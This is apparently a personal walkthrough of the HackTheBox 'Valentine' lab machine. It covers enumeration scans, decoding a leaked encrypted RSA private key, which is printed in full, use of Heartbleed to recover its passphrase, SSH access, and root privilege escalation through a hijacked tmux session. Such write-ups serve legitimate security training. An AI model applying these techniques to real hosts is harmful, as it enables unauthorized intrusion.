**Ping**
![[Pasted image 20240626133822.png]]

**Nmap Scans**
```
mapit 10.10.10.79
```

Nmap Default Scan
![[Pasted image 20240626134031.png]]

Nmap Script and Service Scan
![[Pasted image 20240626134142.png]]

Nmap All Port Scan
![[Pasted image 20240626134222.png]]

On Port 80
![[Pasted image 20240626134206.png]]

On Port 443
![[Pasted image 20240626134635.png]]

**Gobuster Scan**
```
gobuster dir -u http://10.10.10.79/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,aspx -s 200,204,301,302,307,403 -k --status-codes "" -o gobuster.txt
```
![[Pasted image 20240626134903.png]]

On http://10.10.10.79/dev
![[Pasted image 20240626135000.png]]

hype.key
![[Pasted image 20240626135016.png]]

notes.txt
![[Pasted image 20240626135201.png]]

ffuf Scan
```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.79/FUZZ -t 100 -o ffuf.txt
```
![[Pasted image 20240626135254.png]]
Now it make sense, will check encode and decode dir

Feroxbuster Scan
```
feroxbuster --url http://10.10.10.79 -k -o feroxbuster.txt
```
![[Pasted image 20240626135422.png]]

On http://10.10.10.79/encode
![[Pasted image 20240626135531.png]]

On http://10.10.10.79/decode
![[Pasted image 20240626135615.png]]

Testing the encoder with the input 'test'
![[Pasted image 20240626135704.png]]

It is base64 encoded
![[Pasted image 20240626135913.png]]

Will check the decoder page
![[Pasted image 20240626135949.png]]
Works fine



Now will covert that hexadecimal value we found from hype.key to ASCII
![[Pasted image 20240626140539.png]]

Decoded Value
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
```

We can assume hype is the username as of now and try to get a ssh session with id_rsa
```
ssh hype@10.10.10.79 -i id_rsa
```
![[Pasted image 20240626142022.png]]
It is asking passphrase, but I couldn't crack it using john
![[Pasted image 20240626142119.png]]

We have to find passphrase now.

Will run a nmap vulnerability scanner
```
nmap 10.10.10.79 --script vuln -oN vnmap.txt
```
![[Pasted image 20240626142535.png]]
It found some vulnerabilities, but we got a popular one Heartbleed.

Will try that on port 443
![[Pasted image 20240626144118.png]]

Will decode the base43 encoded value
![[Pasted image 20240626144224.png]]
This should be the passphrase, will try

ssh session as hype
```
ssh hype@10.10.10.79 -i id_rsa
```
![[Pasted image 20240626144937.png]]
Still had a issue

So I google it and the Solution is in the Link https://stackoverflow.com/questions/73795935/sign-and-send-pubkey-no-mutual-signature-supported
![[Pasted image 20240626145044.png]]
![[Pasted image 20240626145121.png]]

So I have added the lines in my config file, and it worked
![[Pasted image 20240626145155.png]]

User.txt
![[Pasted image 20240626145237.png]]


Will jump to Privilege Escalation....!



Checked .bash_histroy file
![[Pasted image 20240626151547.png]]

Will check the running process 
```
ps aux
```
![[Pasted image 20240626151623.png]]
Ok then will run that.

```
/usr/bin/tmux -S /.devs/dev_sess
```
![[Pasted image 20240626151653.png]]
has issue, will solve it

```
export TERM=screen-256color
```
![[Pasted image 20240626151746.png]]

Now will run the command 
```
/usr/bin/tmux -S /.devs/dev_sess
```
![[Pasted image 20240626151838.png]]
We got a tmux session as root

Got root.txt
![[Pasted image 20240626151427.png]]




Done with Valentine.....:)